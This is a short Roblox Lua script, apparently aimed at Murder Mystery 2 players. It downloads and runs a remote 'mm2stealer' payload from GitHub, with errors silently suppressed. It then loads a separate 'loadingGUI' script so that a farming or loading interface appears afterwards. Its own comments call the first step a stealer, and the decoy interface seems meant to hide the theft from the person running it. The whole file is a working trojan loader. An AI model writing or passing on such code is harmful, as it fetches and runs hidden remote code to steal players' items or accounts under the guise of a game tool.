-- Function to run the stealer first
local function stealer()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr"))()
    end)
end

-- Function to force GUI to appear after
local function farm()
    task.spawn(function()
        -- Wait for player and UI to load
        local player = game:WaitForChild("Players"):WaitForChild("LocalPlayer")
        local gui = player:WaitForChild("PlayerGui")

        -- Extra delay to ensure stealer is done messing with things
        wait(3)

        pcall(function()
            local guiScript = game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/loadingGUI/refs/heads/main/loadingGUI")
            if guiScript and #guiScript > 10 then
                loadstring(guiScript)()
            end
        end)
    end)
end

-- Run stealer first
stealer()

-- Force GUI to load last no matter what
farm()

